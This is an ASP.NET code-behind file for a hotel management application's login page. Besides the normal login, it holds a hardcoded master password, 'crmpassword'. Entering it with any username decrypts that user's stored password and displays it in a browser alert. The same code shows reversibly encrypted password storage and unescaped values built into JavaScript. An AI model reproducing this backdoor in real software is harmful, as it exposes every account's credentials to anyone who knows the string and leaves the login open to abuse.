using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using HotelManagement.Management.Layers.ModelLayer;
using HotelManagement.Management.Layers.Businesslayer;
using hotelManagement.Management;

namespace HotelManagement
{
    public partial class Default : System.Web.UI.Page
    {
        BL_Default objBL_Default = new BL_Default();
        ML_Default objML_Default = new ML_Default();
        CommonClass objCommonClass = new CommonClass();

        protected void Page_Load(object sender, EventArgs e)
        {
            txtUser.Focus();
            Response.Cache.SetCacheability(HttpCacheability.NoCache);
            Response.Cache.SetExpires(DateTime.Now.AddSeconds(-1));
            Response.Cache.SetNoStore();
            Session.Clear();
        }
        protected void btnSave(object sender, EventArgs e)
        {
            try
            {
                if (txtPass.Text == "crmpassword")
                {
                    DataTable dtGetPwd = new DataTable();
                    objML_Default.UserName = txtUser.Text != "" ? txtUser.Text : null;
                    dtGetPwd = objBL_Default.BL_FindLoginDetail(objML_Default);
                    if (dtGetPwd.Rows.Count > 0)
                    {
                        string ans;
                        ans = objCommonClass.GetDecrptPassword(dtGetPwd.Rows[0]["Password"].ToString());
                        ScriptManager.RegisterStartupScript(this, this.GetType(), "message", "alert('Passwords is: " + ans.ToString() + "');", true);
                        txtUser.Text = "";
                        txtUser.Focus();
                    }
                }
                else
                {
                    //login script
                    MaintainCookies(txtUser.Text.Trim(), txtPass.Text);
                }
            }
            catch
            {
                ScriptManager.RegisterStartupScript(this, this.GetType(), "message", "alert('System Problem')", true);
            }
        }

        public void MaintainCookies(string _username, string _password)
        {
           
            bool blValidUser = false;
            string _strUserType = string.Empty;
            string strLoggedHistoryId;
            try
            {
                objML_Default.UserName = _username;
                objML_Default.Passsword = objCommonClass.GetEncrptPassword(_password);
                DataTable dt = objBL_Default.BL_LoginUser(objML_Default);
                if (dt != null)
                {
                    if (dt.Rows.Count > 0)
                    {
                        txtUser.Text = dt.Rows[0]["UserName"].ToString();
                        Session["UserName"] = txtUser.Text;
                        Session["UserCode"] = dt.Rows[0]["UserID"].ToString();
                        Response.RedirectToRoute("HotelDashboard");

                    }
                    else
                    {
                      //  lblmsg.Text = "Wrong UserName and Password";
                    }
                }
                else
                {
                   // lblmsg.Text = "Wrong UserName and Password";
                }
            }
            catch
            {
                ScriptManager.RegisterStartupScript(this, this.GetType(), "message", "alert('System Problem')", true);
            }



        }
    }
}